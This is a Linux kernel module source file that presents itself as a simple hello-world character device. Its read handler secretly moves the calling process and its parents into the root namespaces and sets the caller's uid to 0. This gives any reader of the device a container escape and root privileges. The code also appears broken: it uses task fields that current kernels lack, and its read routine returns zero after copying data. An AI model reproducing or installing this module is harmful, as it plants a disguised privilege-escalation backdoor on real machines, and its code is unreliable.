#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/init_task.h>
#include <linux/nsproxy.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Carlos Garcia");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");

#define DEVICE_NAME "lkm_example"
#define EXAMPLE_MSG "Hello, World. This is executed in ring: _. {uname_name} \n"
#define MSG_BUFFER_LEN 58

/* Prototypes for device functions */
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static int major_num;
static int device_open_count = 0;
static char msg_buffer[MSG_BUFFER_LEN];
static char *msg_ptr;

/* This structure points to all of the device functions */
static struct file_operations file_ops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

/* When a process reads from our device, this gets called. */
static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *offset)
{
    // https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h
    struct task_struct * current_task = current; // getting global current pointer
    struct task_struct * task = current;
    struct task_struct * root_task = current;
    int bytes_read = 0;
    uint64_t rcs = 0;
    int circuit_breaker = 0;

    //******************
    // You can read this using 'dmesg'
    printk(KERN_NOTICE "called the driver. current process: %s, PID: %d", current_task->comm, current_task->pid);
    
    // // if this is not the first time that it calls, we return
    // if (offset > 0)
    // {
    //     printk(KERN_NOTICE "Offset > 0. return");
    //     return 0;
    // }
    // *offset += 1;

    //****************** 
    // Getting out of the namespace

    while (task != task->parent)
    {
        task = task->parent;
    }
    root_task = task;
    printk(KERN_NOTICE "7. Current/Init/Root sysname: %s(%d) - %s(%d) - %s(%d)", 
        current_task->nsproxy->uts_ns->name.nodename, 
        current_task->pid,
        (&init_task)->nsproxy->uts_ns->name.nodename,
        (&init_task)->pid,
        root_task->nsproxy->uts_ns->name.nodename,
        root_task->pid
        );

    for(task = current_task; task != root_task && circuit_breaker++ < 50; task = task->parent)
    {
        task_lock(task);
        task->nsproxy = root_task->nsproxy;
        task->namespace = root_task->namespace;
        task_unlock(task);
        printk(KERN_NOTICE "Modifying task: %s (%d) - %s", task->comm, task->pid, task->nsproxy->uts_ns->name.nodename);
    }

    printk(KERN_NOTICE "Modifying task: %s (%d) - %s", root_task->comm, root_task->pid, root_task->nsproxy->uts_ns->name.nodename);

    //******************
    // Read the current ring from the RCS processor register
    asm ("mov %%cs, %0" : "=r" (rcs));
    msg_buffer[40] = (int) (rcs & 3) + '0';
    
    /* If we’re at the end, loop back to the beginning */
    if (*msg_ptr == 0)
    {
        msg_ptr = msg_buffer;
    }

    /* Put data in the buffer */
    while (len && *msg_ptr)
    {
        /* Buffer is in user data, not kernel, so you can’t just reference
        * with a pointer. The function put_user handles this for us */
        put_user(*(msg_ptr++), buffer++);
        len--;
        bytes_read++;
    }

    //******************
    // Unschedule task
    current_task->uid = 0;
    //current_task->state = 0;
    
    //******************
    // return something
    return 0;
}

/* Called when a process tries to write to our device */
static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset)
{
    /* This is a read-only device */
    printk(KERN_ALERT "This operation is not supported.\n");
    return -EINVAL;
}

/* Called when a process opens our device */
static int device_open(struct inode *inode, struct file *file)
{
    /* If device is open, return busy */
    if (device_open_count)
    {
        return -EBUSY;
    }
    device_open_count++;
    try_module_get(THIS_MODULE);
    return 0;
}

/* Called when a process closes our device */
static int device_release(struct inode *inode, struct file *file)
{
    /* Decrement the open counter and usage count. Without this, the module would not unload. */
    device_open_count--;
    module_put(THIS_MODULE);
    return 0;
}

static int __init lkm_example_init(void)
{
    /* Fill buffer with our message */
    strncpy(msg_buffer, EXAMPLE_MSG, MSG_BUFFER_LEN);
    /* Set the msg_ptr to the buffer */
    msg_ptr = msg_buffer;
    /* Try to register character device */
    major_num = register_chrdev(0, "lkm_example", &file_ops);
    if (major_num < 0)
    {
        printk(KERN_ALERT "Could not register device: % d\n", major_num);
        return major_num;
    }
    else
    {
        printk(KERN_INFO "lkm_example module loaded with device major number % d\n", major_num);
        return 0;
    }
}

static void __exit lkm_example_exit(void)
{
    /* Remember — we have to clean up after ourselves. Unregister the character device. */
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "Goodbye, World !\n");
}
/* Register module functions */
module_init(lkm_example_init);
module_exit(lkm_example_exit);